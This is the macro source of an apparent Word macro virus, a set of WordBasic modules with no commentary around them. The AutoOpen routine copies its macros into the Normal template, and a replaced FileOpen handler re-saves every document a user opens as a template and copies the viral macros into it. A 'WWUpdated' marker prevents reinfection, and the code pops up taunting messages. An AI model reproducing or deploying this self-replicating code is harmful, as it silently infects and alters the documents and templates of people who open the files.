   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DaniloffMuDaK"

   Public Sub MAIN()
   Dim OurCopyright$
   Dim AVPcopyright$
   Dim DowniloffCopyright$
   Dim sQuestion$
   Dim gnoi
   Dim iCountMacros
   Dim i
   Dim zu$
   ' this macro loaded in normal template as FileOpen
   OurCopyright$ = "Co-Copyright (cc) LordAsd and Stainless Steel Rat"
   AVPcopyright$ = "AVP for WinWord v1.0"
   DowniloffCopyright$ = "DaniloffMuDaK"
   sQuestion$ = "Would you like to "

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   On Error GoTo -1: On Error GoTo fail
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   WordBasic.MsgBox WordBasic.[FileName$]()

   gnoi = 0
   iCountMacros = WordBasic.CountMacros(1, 0, 0)
   For i = 1 To iCountMacros
    zu$ = WordBasic.[MacroName$](i, 1)
    If zu$ = "WWUpdated" Then gnoi = 1
   Next i

   If gnoi = 1 Then GoTo fail
   WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
   WordBasic.MacroCopy "Normal:AutoOp", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Normal:WWUpdated", WordBasic.[FileName$]() + ":WWUpdated"
   WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[FileName$]() + ":DaniloffMuDaK"

   WordBasic.MsgBox "Suxx"
   fail:
   End Sub

   Attribute VB_Name = "WWUpdated"

   Public Sub MAIN()
   'Presence of AVP for winword
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim hru
   Dim j
   Dim i
   On Error GoTo -1: On Error GoTo fail
   hru = 0
   j = WordBasic.CountMacros(0, 0)
   For i = 1 To j
    If WordBasic.[MacroName$](i, 0, 0) = "WWUpdated" Then hru = 1
   Next i

   If hru = 1 Then GoTo fail

   WordBasic.MsgBox "Gnoi"

   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal:AutoOp"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":WWUpdated", "Normal:WWUpdated"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":DaniloffMuDaK", "Normal:FileOpen"
   fail:
   End Sub
